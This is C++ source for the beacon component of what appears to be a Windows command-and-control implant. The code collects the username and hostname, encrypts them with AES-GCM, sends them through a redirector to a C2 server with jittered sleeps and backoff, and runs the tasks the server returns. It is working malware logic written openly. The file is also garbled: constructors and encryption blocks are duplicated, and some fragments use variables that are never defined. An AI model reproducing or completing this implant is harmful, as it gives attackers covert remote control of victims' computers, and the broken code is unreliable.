#include "Beacon.h"

#include "../core/Config.h"
#include "../core/ImplantId.h"
#include "../crypto/AesGcm.h"
#include "../http/RedirectorResolver.h"
#include "../http/WinHttpClient.h"
#include "Task.h"
#include "../external/nlohmann/json.hpp"

#include <algorithm>
#include <chrono>
#include <iterator>
#include <random>
#include <thread>
#include <vector>

#include <windows.h>
#include <winhttp.h>

namespace {
    beacon::TaskType stringToTaskType(const std::string& str) {
        if (str == "sysinfo") return beacon::TaskType::SYSINFO;
        // Add other mappings here
        return beacon::TaskType::UNKNOWN;
    }

    std::string getUsername() {
        DWORD username_len = 0;
        GetUserNameW(NULL, &username_len);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            std::vector<wchar_t> username(username_len);
            if (GetUserNameW(username.data(), &username_len)) {
                int len = WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, NULL, 0, NULL, NULL);
                std::string result(len, 0);
                WideCharToMultiByte(CP_UTF8, 0, username.data(), username_len - 1, &result[0], len, NULL, NULL);
                return result;
            }
        }
        return "Unknown";
    }

    std::vector<wchar_t> buffer(len);
    if (!GetUserNameW(buffer.data(), &len)) {
        return "Unknown";
    }

    // len includes null terminator
    return wideToUtf8(buffer.data(), len - 1);
}

std::string getHostname() {
    DWORD len = 0;
    GetComputerNameW(nullptr, &len);

    if (GetLastError() != ERROR_BUFFER_OVERFLOW || len == 0) {
        return "Unknown";
    }

    std::vector<wchar_t> buffer(len);
    if (!GetComputerNameW(buffer.data(), &len)) {
        return "Unknown";
    }

Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
    implantId_ = core::generateImplantId();
}

// Simple RAII wrapper for CryptoAPI provider
class CryptoProvider {
public:
    CryptoProvider() {
        acquired_ = CryptAcquireContext(
            &prov_, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    }

    ~CryptoProvider() {
        if (acquired_) {
            CryptReleaseContext(prov_, 0);
        }
    }

    bool valid() const { return acquired_; }

    bool random(BYTE* data, DWORD len) {
        return acquired_ && CryptGenRandom(prov_, len, data);
    }

private:
    HCRYPTPROV prov_{};
    bool acquired_{false};
};

} // anonymous namespace

namespace beacon {

Beacon::Beacon()
    : c2FetchBackoff_(core::C2_FETCH_BACKOFF),
      implantId_(core::generateImplantId()) {}

void Beacon::sleepWithJitter() {
    std::random_device rd;
    std::mt19937 gen(rd());

    std::normal_distribution<> dist(
        core::SLEEP_BASE,
        core::SLEEP_BASE * (core::JITTER_PCT / 100.0));

    double seconds = std::max(3.0, dist(gen));
    std::this_thread::sleep_for(
        std::chrono::milliseconds(
            static_cast<int>(seconds * 1000.0)));
}

void Beacon::run() {
    http::RedirectorResolver resolver(core::REDIRECTOR_URL);

    std::vector<BYTE> key(core::BEACON_KEY,
                          core::BEACON_KEY + 32);
    crypto::AesGcm aes(key);

    while (true) {

        // -----------------------------
        // Resolve C2
        // -----------------------------
        if (c2Url_.empty()) {
            try {
                c2Url_ = resolver.resolve();
                c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
            } catch (const std::exception&) {
                std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
                if (c2FetchBackoff_ < 35 * 60) {
                    c2FetchBackoff_ *= 2;
                }
                continue;
            }
        }

        try {
            // -----------------------------
            // Build payload
            // -----------------------------
            nlohmann::json payload{
                {"id", implantId_},
                {"os", "windows"},
                {"arch", "amd64"},
                {"user", getUsername()},
                {"host", getHostname()},
                {"results", nlohmann::json::array()}
            };

            Result result;
            while (pendingResults_.try_dequeue(result)) {
                inFlightResults_.push_back(result);
            }

            for (const auto& res : inFlightResults_) {
                payload["results"].push_back({
                    {"task_id", res.task_id},
                    {"output", res.output},
                    {"error", res.error}
                });
            }

            std::string payloadStr = payload.dump();
            std::vector<BYTE> plaintext(
                payloadStr.begin(), payloadStr.end());

            // -----------------------------
            // Generate nonce
            // -----------------------------
            std::vector<BYTE> nonce(12);
            CryptoProvider crypto;
            if (!crypto.valid() ||
                !crypto.random(nonce.data(),
                               static_cast<DWORD>(nonce.size()))) {
                continue;
            }

            // -----------------------------
            // Encrypt
            // -----------------------------
            std::vector<BYTE> ciphertext =
                aes.encrypt(plaintext, nonce);

            std::vector<BYTE> encrypted;
            encrypted.reserve(nonce.size() + ciphertext.size());
            encrypted.insert(encrypted.end(),
                             nonce.begin(), nonce.end());
            encrypted.insert(encrypted.end(),
                             ciphertext.begin(), ciphertext.end());

            // -----------------------------
            // Parse URL
            // -----------------------------
            std::wstring wideUrl(c2Url_.begin(), c2Url_.end());

            URL_COMPONENTSW comp{};
            comp.dwStructSize = sizeof(comp);

            wchar_t host[256]{};
            wchar_t path[512]{};

            comp.lpszHostName = host;
            comp.dwHostNameLength = _countof(host);
            comp.lpszUrlPath = path;
            comp.dwUrlPathLength = _countof(path);

            if (!WinHttpCrackUrl(
                    wideUrl.c_str(),
                    static_cast<DWORD>(wideUrl.length()),
                    0,
                    &comp)) {
                c2Url_.clear();
                continue;
            }
            CryptReleaseContext(hProv, 0);

            std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
            std::vector<BYTE> encrypted_payload;
            encrypted_payload.insert(encrypted_payload.end(), nonce.begin(), nonce.end());
            encrypted_payload.insert(encrypted_payload.end(), ciphertext.begin(), ciphertext.end());

            std::wstring wideC2Url(c2Url_.begin(), c2Url_.end());
            URL_COMPONENTSW urlComp;
            wchar_t serverName[256];
            wchar_t path[256];

            memset(&urlComp, 0, sizeof(urlComp));
            urlComp.dwStructSize = sizeof(urlComp);
            urlComp.lpszHostName = serverName;
            urlComp.dwHostNameLength = sizeof(serverName) / sizeof(wchar_t);
            urlComp.lpszUrlPath = path;
            urlComp.dwUrlPathLength = sizeof(path) / sizeof(wchar_t);

            if (!WinHttpCrackUrl(wideC2Url.c_str(), static_cast<DWORD>(wideC2Url.length()), 0, &urlComp)) {
                c2Url_ = "";
                continue;
            }

            std::vector<BYTE> respNonce(
                response.begin(),
                response.begin() + 12);

            std::vector<BYTE> respCipher(
                response.begin() + 12,
                response.end());

                if (response_json.contains("tasks")) {
                    for (const auto& task_json : response_json["tasks"]) {
                        Task task;
                        task.task_id = task_json["task_id"];
                        task.type = stringToTaskType(task_json["type"]);
                        task.cmd = task_json.value("cmd", "");

                        std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, task).detach();
                    }
                }
            }

        } catch (const std::exception&) {
            // Silently continue
        }

        sleepWithJitter();
    }
}

} // namespace beacon
